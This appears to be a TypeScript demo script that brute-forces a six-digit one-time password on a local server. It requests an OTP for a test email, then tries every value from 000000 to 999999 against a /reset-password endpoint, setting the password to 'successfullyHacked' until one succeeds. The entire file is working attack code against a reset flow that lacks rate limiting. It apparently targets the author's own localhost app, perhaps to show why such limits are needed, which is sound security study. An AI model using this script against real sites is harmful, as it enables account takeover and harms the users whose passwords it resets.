import axios from "axios";

async function startAttack() {
  try {
    // initially send a request from a email to generate an otp
    await axios.post("http://localhost:3000/generate-otp", {
      email: "test@gmail.com",
    });

    await new Promise((resolve, reject) => setTimeout(resolve, 5000));

    let start: number = 0;
    let end: number = 999999;

    while (start <= end) {
      try {
        const isFound: {
          data: { message: string; success: boolean };
        } = await axios.post("http://localhost:3000/reset-password", {
          email: "test@gmail.com",
          otp: start.toString(),
          newPassword: "successfullyHacked",
        });

        if (isFound.data.success) {
          console.log(`OTP is ${start}`);
          return;
        }
      } catch (error) {
        console.log(`Not correct ${start}`);
      } finally {
        start++;
      }
    }
  } catch (err: any) {
    console.log("Got error " + err.message);
  }
}

startAttack();
